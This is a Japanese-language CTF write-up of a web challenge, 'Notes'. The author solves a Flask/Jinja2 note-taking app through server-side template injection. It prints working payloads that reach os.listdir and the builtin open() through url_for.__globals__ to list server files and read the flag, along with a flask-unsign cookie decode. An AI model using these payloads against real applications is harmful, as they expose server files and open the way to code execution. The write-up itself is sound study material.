# Notes:Web:881pts
[http://challenges2.hexionteam.com:2001](http://challenges2.hexionteam.com:2001)  

# Solution
URLにアクセスすると次のようなページが開く。  
[site.png](site/site.png)  
どうやら買い物のメモを保存しておくサイトのようで、ソース(Notes.html)を見てやると/notesが存在するらしい。  
Cookieを見てやると、以下のセッションが保存されていた。  
形式からFlask(Jinja2)であることがわかる。  
```text
eyJub3RlcyI6WyJTYXRva2kgPCBIYWhhaGEhIl19.XpSLdw.WPQ1IOdmeqLcVz8SeuI3NzWkfi0
```
デコードしてやるが何もない。  
```bash
$ flask-unsign --decode --cookie 'eyJub3RlcyI6WyJTYXRva2kgPCBIYWhhaGEhIl19.XpSLdw.WPQ1IOdmeqLcVz8SeuI3NzWkfi0'
{'notes': ['Satoki < Hahaha!']}
```
入力欄に`{{`を入力してやると/notesで500エラーが発生する。  
`{{10+10}}`を入力してやると/notesでは20になっているので、Jinja2の式が評価されて出力されている。  
サーバーサイドテンプレートインジェクションをにらんで`{{config}}`を入力すると/notesは以下になる。  
[{{config}}を入力した/notes](notes_{{config}}.html)  
ここからSECRET_KEYを奪い、セッションを偽装するのかとも考えたが、違うようだ。  
サーバーのファイルを読み取りにいく。  
`{{url_for.__globals__.__getitem__('os').listdir('./')}}`を入力すると/notesは以下になる。  
```text
["['.bash_logout', '.bashrc', '.profile', '__pycache__', 'server.py', 'templates', 'flag']"]
```
flagなるファイルがあるようだ。  
`{{url_for.__globals__.__getitem__('__builtins__').__getitem__('open')('flag').read()}}`を入力し表示する。  
```text
["hexCTF{d0nt_r3nder_t3mplates_w1th_u5er_1nput} "]
```

## hexCTF{d0nt_r3nder_t3mplates_w1th_u5er_1nput}